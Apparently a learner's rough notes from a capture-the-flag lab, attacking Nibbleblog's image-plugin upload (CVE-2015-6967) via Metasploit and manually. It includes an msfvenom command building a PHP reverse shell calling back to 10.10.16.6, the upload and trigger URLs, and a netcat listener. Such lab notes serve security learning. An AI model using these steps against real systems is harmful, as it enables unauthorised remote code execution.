now that we know it is vulnerable 

1st method msf

it was not working since i made some mistakes 

basic msf commands

set TARGETURI to /nibbleblog/

other will be as required

and we get a shell in metasploit



2nd method - manual


created a payload
â”€â”€(rootðŸ’€kali)-[~/Desktop/THM/CVE-2015-6967]
â””â”€# msfvenom -p php/reverse_php LHOST:10.10.16.6 LPORT:9900 -f raw -o nibbles3.php


uploaded this to http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image


started nc listener on 9900 and access the upload with this path

10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php



but i was still not able to get a shell


i watched multiple vidoes to see where i was goind wrong

checked this video and changed the php reverse shell file from msfvenom to pentest monkey
